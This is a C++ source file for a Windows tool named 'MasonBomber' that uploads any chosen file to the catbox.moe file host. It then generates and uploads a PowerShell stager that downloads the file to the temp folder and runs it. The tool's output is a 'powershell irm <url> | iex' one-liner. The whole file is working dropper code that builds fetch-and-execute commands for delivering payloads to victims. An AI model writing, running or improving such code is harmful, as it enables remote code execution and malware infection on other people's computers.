#include "MasonBomber.h"
#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <vector>
#include <random>
#include <string>

static std::string WideToUtf8(const std::wstring& w)
{
    if (w.empty())
        return std::string();

    int size = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (size <= 1)
        return std::string();

    std::string result(size - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &result[0], size - 1, nullptr, nullptr);
    return result;
}

std::wstring MasonBomber::GenerateRandomFilename(const std::wstring& extension)
{
    const std::wstring chars = L"abcdefghijklmnopqrstuvwxyz0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, static_cast<int>(chars.size()) - 1);

    std::wstring filename;
    for (int i = 0; i < 8; ++i)
    {
        filename += chars[dis(gen)];
    }
    return filename + extension;
}

std::string MasonBomber::UploadToCatbox(const std::wstring& filePath)
{
    HINTERNET hInternet = InternetOpenA("BOMBER_PREMIUM", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetConnectA(hInternet, "catbox.moe", INTERNET_DEFAULT_HTTPS_PORT,
        NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect)
    {
        InternetCloseHandle(hInternet);
        return "";
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/user/api.php", NULL, NULL, NULL,
        INTERNET_FLAG_SECURE, 0);
    if (!hRequest)
    {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file)
    {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::streamsize fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<char> fileBuffer(static_cast<size_t>(fileSize));
    if (!file.read(fileBuffer.data(), fileSize))
    {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
    std::string contentType = "multipart/form-data; boundary=" + boundary;

    std::string postData = "--" + boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"reqtype\"\r\n\r\n";
    postData += "fileupload\r\n";
    postData += "--" + boundary + "\r\n";
    postData += "Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"file\"\r\n";
    postData += "Content-Type: application/octet-stream\r\n\r\n";
    postData += std::string(fileBuffer.data(), static_cast<size_t>(fileSize)) + "\r\n";
    postData += "--" + boundary + "--\r\n";

    if (!HttpSendRequestA(hRequest, ("Content-Type: " + contentType).c_str(), -1,
        const_cast<char*>(postData.c_str()), static_cast<DWORD>(postData.length())))
    {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "";
    }

    char responseBuffer[4096];
    DWORD bytesRead = 0;
    std::string response;

    while (InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer), &bytesRead) && bytesRead > 0)
    {
        response.append(responseBuffer, bytesRead);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return response;
}

std::string MasonBomber::RemoveHTTPS(const std::string& url)
{
    std::string result = url;
    size_t pos = result.find("https://");
    if (pos != std::string::npos)
    {
        result.erase(pos, 8);
    }
    return result;
}

void MasonBomber::ShowTopmostMessage(const std::string& title, const std::string& message)
{
    MessageBoxA(NULL, message.c_str(), title.c_str(), MB_OK | MB_TOPMOST);
}

void MasonBomber::BrowseFile()
{
    OPENFILENAMEW ofn;
    WCHAR filePathBuffer[MAX_PATH] = { 0 };

    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = NULL;
    ofn.lpstrFile = filePathBuffer;
    ofn.nMaxFile = MAX_PATH;
    ofn.lpstrFilter = L"All Files\0*.*\0\0";
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;

    if (GetOpenFileNameW(&ofn))
    {
        wFilePath = filePathBuffer;
        filePath = WideToUtf8(wFilePath);
    }
}

void MasonBomber::HandleUpload()
{
    generatedOneLiner.clear();

    if (wFilePath.empty() || GetFileAttributesW(wFilePath.c_str()) == INVALID_FILE_ATTRIBUTES)
    {
        MessageBoxA(NULL, "File does not exist!", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    std::string fileUrl = UploadToCatbox(wFilePath);
    if (fileUrl.empty())
    {
        MessageBoxA(NULL, "Failed to upload file", "Upload Failed", MB_OK | MB_ICONWARNING);
        return;
    }

    size_t pos = wFilePath.find_last_of(L"\\/");
    std::wstring wName = (pos == std::wstring::npos) ? wFilePath : wFilePath.substr(pos + 1);
    std::string originalFilename = WideToUtf8(wName);

    std::wstring randomFilenameW = GenerateRandomFilename(L".bat");
    std::string randomFilename = WideToUtf8(randomFilenameW);

    std::string fileUrlNoHTTPS = RemoveHTTPS(fileUrl);

    std::string psScript =
        "$url = '" + fileUrlNoHTTPS + "'\n"
        "$tempFile = Join-Path $env:TEMP '" + originalFilename + "'\n"
        "Invoke-WebRequest -Uri $url -OutFile $tempFile\n"
        "Start-Process -FilePath $tempFile -Wait";

    std::string psFilePath = "download_" + randomFilename + ".ps1";
    std::ofstream psFile(psFilePath, std::ios::out | std::ios::trunc);
    if (!psFile.is_open())
    {
        MessageBoxA(NULL, "Failed to create PowerShell script", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    psFile << psScript;
    psFile.close();

    std::wstring psFilePathW(psFilePath.begin(), psFilePath.end());
    std::string psFileUrl = UploadToCatbox(psFilePathW);
    DeleteFileA(psFilePath.c_str());

    if (psFileUrl.empty())
    {
        MessageBoxA(NULL, "Failed to upload PowerShell script", "Upload Failed", MB_OK | MB_ICONWARNING);
        return;
    }

    std::string psFileUrlNoHTTPS = RemoveHTTPS(psFileUrl);
    std::string finalCommand = "powershell \"irm " + psFileUrlNoHTTPS + " | iex\"";

    generatedOneLiner = finalCommand;
}
